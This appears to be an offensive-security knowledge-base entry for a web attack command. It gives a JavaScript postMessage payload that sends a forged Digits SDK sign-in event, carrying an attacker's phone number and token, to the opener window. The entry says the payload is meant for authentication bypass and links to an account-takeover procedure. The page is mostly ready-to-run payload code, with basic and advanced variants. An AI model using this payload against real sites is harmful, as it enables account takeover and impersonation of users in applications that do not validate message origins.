---
data: >-
  window.opener.postMessage({ type: 'digits_sdk_sign_in', data: { phone:
  'attacker-phone', token: 'fake-token' } }, '*');
tags:
  - web
  - postmessage
type: command
executor: javascript
platforms:
  - Web
id: bbce0bbd-7277-4065-b9f1-fec09002393d
created_at: '2025-12-11T06:10:28.543Z'
updated_at: '2025-12-11T06:10:28.543Z'
verified: false
validated: true
submitted: true
---
# postmessage-send-fake-signin

## Command

```javascript
window.opener.postMessage({ type: 'digits_sdk_sign_in', data: { phone: 'attacker-phone', token: 'fake-token' } }, '*');
```

## Description

Sends a fake sign-in postMessage event to the opener window, injecting attacker's data for authentication bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `type` | Message type (digits_sdk_sign_in) | Yes |
| `data` | Object with phone and token | Yes |
| `targetOrigin` | Set to '*' for bypass | Yes |

## Examples

### Basic Usage

```javascript
window.opener.postMessage({ type: 'digits_sdk_sign_in', data: { phone: '+1234567890', token: 'fake' } }, '*');
```

### Advanced Usage

```javascript
var payload = { type: 'digits_sdk_sign_in', data: { phone: 'attacker-phone', token: 'stolen-token', other: 'data' } };
window.opener.postMessage(payload, '*');
```

## Expected Output

The message is sent and processed by the target window if origin validation is bypassed, resulting in silent data acceptance.

## Related

- [[procedures/Trigger-Fake-Sign-In-PostMessage]]
- [[Bypassing Digits SDK Origin Validation for Account Takeover]]
